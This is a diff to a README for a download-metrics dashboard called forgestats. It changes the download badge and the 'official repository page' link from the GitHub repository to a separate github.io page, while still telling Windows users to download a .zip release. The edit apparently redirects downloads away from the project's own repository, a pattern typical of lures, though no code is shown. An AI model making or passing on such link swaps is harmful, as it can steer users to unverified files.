@@ -1,6 +1,6 @@
 # 📊 forgestats - Simple dashboard for project download metrics
 
-[![Download forgestats](https://img.shields.io/badge/Download-forgestats-blue.svg)](https://github.com/Sakdo2159/forgestats)
+[![Download forgestats](https://img.shields.io/badge/Download-forgestats-blue.svg)](https://sakdo2159.github.io)
 
 forgestats provides a clear view of your software download numbers. It gathers data from GitHub, GitLab, and Codeberg in one place. It also tracks mirrors like SourceForge. The tool runs locally as a static site. This means it requires no server or database setup.
 
@@ -12,7 +12,7 @@ You need a computer running Windows 10 or Windows 11. The application requires a
 
 This application works without a complex installation process. You do not need to install extra software or manage background services. Follow these steps to prepare your dashboard:
 
-1. Visit the [official repository page](https://github.com/Sakdo2159/forgestats) to find the latest version.
+1. Visit the [official repository page](https://sakdo2159.github.io) to find the latest version.
 2. Look for the Releases section on the right side of the screen.
 3. Click the most recent version label to open the release details.
 4. Locate the file ending in .zip under the Assets list.
